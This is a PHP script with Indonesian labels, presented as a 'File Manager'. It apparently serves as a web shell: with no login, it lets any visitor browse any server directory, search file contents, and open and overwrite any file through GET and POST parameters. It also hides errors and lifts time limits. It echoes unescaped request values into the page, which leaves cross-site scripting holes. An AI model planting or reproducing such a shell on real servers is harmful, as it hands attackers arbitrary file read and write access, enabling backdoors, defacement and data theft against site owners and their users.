<?php
error_reporting(0);
set_time_limit(0);

function scan_with_glob($path) {
    return glob($path . '/*') ?: [];
}

function scan_with_opendir($path) {
    $files = [];
    if ($handle = @opendir($path)) {
        while (false !== ($entry = readdir($handle))) {
            $files[] = $entry;
        }
        closedir($handle);
    }
    return $files;
}

function check_writable($path) {
    return is_writable($path) ? 'class="writable"' : 'class="readonly"';
}

function search_string_in_files($directory, $search_string, $extension) {
    $result = [];
    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory));
    foreach ($files as $file) {
        if ($file->isFile() && ($extension == "*" || pathinfo($file->getFilename(), PATHINFO_EXTENSION) == $extension)) {
            $content = file_get_contents($file->getPathname());
            if (preg_match('/' . preg_quote($search_string, '/') . '/i', $content)) {
                $result[] = $file->getPathname();
            }
        }
    }
    return $result;
}

$current_dir = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
if (!is_dir($current_dir)) {
    $current_dir = getcwd();
}

$search_results = [];
if (isset($_GET['search']) && isset($_GET['ext'])) {
    $search_results = search_string_in_files($current_dir, $_GET['search'], $_GET['ext']);
}

$files = array_unique(array_merge(scan_with_glob($current_dir), scan_with_opendir($current_dir)));

echo "<html><head><style>
body { font-family: Arial, sans-serif; margin: 20px; }
.writable { color: green; }
.readonly { color: red; }
.container { max-width: 800px; margin: auto; }
input, textarea, button { margin: 5px; padding: 8px; width: 95%; }
.file-list li { margin: 5px 0; }
</style></head><body><div class='container'>";

echo "<h2>📂 File Manager - $current_dir</h2>
<form method='GET'>
    <input type='text' name='dir' value='$current_dir' placeholder='Masukkan direktori'>
    <button type='submit'>Go</button>
</form>";

echo "<form method='GET'>
    <input type='hidden' name='dir' value='$current_dir'>
    <input type='text' name='search' placeholder='Cari string dalam file'>
    <input type='text' name='ext' placeholder='Ekstensi file (misal: php, txt, *)'>
    <button type='submit'>Search</button>
</form>";

if (!empty($search_results)) {
    echo "<h3>🔍 Hasil Pencarian:</h3><ul>";
    foreach ($search_results as $result) {
        echo "<li><a href='?edit=" . urlencode($result) . "'>" . htmlspecialchars($result) . "</a></li>";
    }
    echo "</ul>";
}

echo "<h3>📂 Direktori</h3><ul class='file-list'>";
foreach ($files as $file) {
    $full_path = rtrim($current_dir, '/') . '/' . $file;
    $style = check_writable($full_path);
    if (is_dir($full_path)) {
        echo "<li $style>📁 <a href='?dir=" . urlencode($full_path) . "'>$file</a>
                <a href='?rename=$full_path'>[Rename]</a>
                <a href='?delete=$full_path'>[Delete]</a>
              </li>";
    } else {
        echo "<li $style>📄 $file
                <a href='?edit=" . urlencode($full_path) . "'>[Edit]</a>
                <a href='?rename=$full_path'>[Rename]</a>
                <a href='?delete=$full_path'>[Delete]</a>
                <a href='?download=$full_path'>[Download]</a>
              </li>";
    }
}
echo "</ul>";

if (isset($_GET['edit'])) {
    $file_to_edit = $_GET['edit'];
    if (is_file($file_to_edit) && is_readable($file_to_edit)) {
        $content = htmlspecialchars(file_get_contents($file_to_edit));
        echo "<h3>✏️ Editing: $file_to_edit</h3>
              <form method='POST'>
                  <textarea name='file_content' rows='10'>$content</textarea><br>
                  <input type='hidden' name='file_path' value='$file_to_edit'>
                  <button type='submit' name='save_file'>Save</button>
              </form>";
    } else {
        echo "<p class='readonly'>⚠️ File tidak bisa diedit.</p>";
    }
}

if (isset($_POST['save_file'])) {
    file_put_contents($_POST['file_path'], $_POST['file_content']);
    echo "<p class='writable'>✅ File berhasil disimpan.</p>";
}

echo "</div></body></html>";
?>
